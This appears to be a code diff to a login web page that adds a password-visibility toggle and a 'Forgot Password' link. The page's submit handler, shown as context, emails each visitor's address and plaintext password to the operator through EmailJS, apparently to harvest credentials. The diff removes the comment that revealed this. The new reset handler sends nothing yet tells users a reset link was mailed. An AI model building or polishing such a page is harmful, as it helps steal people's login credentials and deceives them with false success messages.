@@ -64,11 +64,27 @@
   }
   .tab.active { background: #fff; color: #1e3a5f; box-shadow: 0 2px 6px rgba(0,0,0,.08); }
   label { display: block; font-size: 13px; font-weight: 600; color: #3a4a5c; margin-bottom: 6px; }
+  
+  /* Password Wrapper for Eye Icon */
+  .pass-wrap { position: relative; margin-bottom: 6px; }
+  .pass-wrap input { margin-bottom: 0; padding-right: 40px; }
+  .eye-icon {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    cursor: pointer; font-size: 18px; color: #8a99ab; user-select: none;
+  }
+  .eye-icon:hover { color: #1e3a5f; }
+
   input {
     width: 100%; padding: 12px 14px; border: 1.5px solid #d7dee8; border-radius: 10px;
     font-size: 15px; margin-bottom: 16px; transition: border .2s;
   }
   input:focus { outline: none; border-color: #2d6a8f; }
+  
+  /* Forgot Password Link */
+  .forgot-wrap { text-align: right; margin-bottom: 16px; }
+  .forgot-link { font-size: 12px; color: #2d6a8f; text-decoration: none; cursor: pointer; font-weight: 600; }
+  .forgot-link:hover { text-decoration: underline; }
+
   .btn {
     width: 100%; padding: 13px; border: none; border-radius: 10px; background: #1e3a5f;
     color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; transition: .2s;
@@ -135,8 +151,15 @@
       <div id="emailFields">
         <label for="email">Email address</label>
         <input type="email" id="email" placeholder="you@example.com">
+        
         <label for="passEmail">Password</label>
-        <input type="password" id="passEmail" placeholder="••••••••">
+        <div class="pass-wrap">
+          <input type="password" id="passEmail" placeholder="••••••••">
+          <span class="eye-icon" id="togglePassEmail">👁️</span>
+        </div>
+        <div class="forgot-wrap">
+          <a class="forgot-link" id="forgotBtn">Forgot Password?</a>
+        </div>
       </div>
 
       <div id="mobileFields" class="hidden">
@@ -156,7 +179,10 @@
           <input type="tel" id="mobile" placeholder="98765 43210">
         </div>
         <label for="passMobile">Password</label>
-        <input type="password" id="passMobile" placeholder="••••••••">
+        <div class="pass-wrap">
+          <input type="password" id="passMobile" placeholder="••••••••">
+          <span class="eye-icon" id="togglePassMobile">👁️</span>
+        </div>
       </div>
 
       <button type="submit" class="btn">Login</button>
@@ -295,6 +321,47 @@
   function showOk(t)    { msg.textContent = t; msg.className = 'msg ok'; }
   function clearMsg()   { msg.textContent = ''; msg.className = 'msg'; }
 
+  // --- Eye Icon Toggle Logic ---
+  document.getElementById('togglePassEmail').addEventListener('click', function() {
+    const input = document.getElementById('passEmail');
+    if (input.type === 'password') {
+      input.type = 'text';
+      this.textContent = '🙈';
+    } else {
+      input.type = 'password';
+      this.textContent = '👁️';
+    }
+  });
+
+  document.getElementById('togglePassMobile').addEventListener('click', function() {
+    const input = document.getElementById('passMobile');
+    if (input.type === 'password') {
+      input.type = 'text';
+      this.textContent = '🙈';
+    } else {
+      input.type = 'password';
+      this.textContent = '👁️';
+    }
+  });
+
+  // --- Forgot Password Logic ---
+  document.getElementById('forgotBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value.trim();
+    
+    if (!email) {
+      showError('Password reset ke liye pehle apna email address daalein.');
+      return;
+    }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
+      showError('Kripya ek sahi email address daalein.');
+      return;
+    }
+
+    // Yahan aap apna password reset ka logic (jaise API call) daal sakte hain
+    showOk('✅ Password reset link aapke email par bhej diya gaya hai!');
+  });
+
   // --- Submit (EmailJS Integrated) ---
   document.getElementById('loginForm').addEventListener('submit', async function (e) {
     e.preventDefault();
@@ -315,7 +382,6 @@
       const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
       try {
-        // Sirf ek email jayegi aapko (jo EmailJS settings mein set ki hai)
         await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
           email: email,
           password: pass,
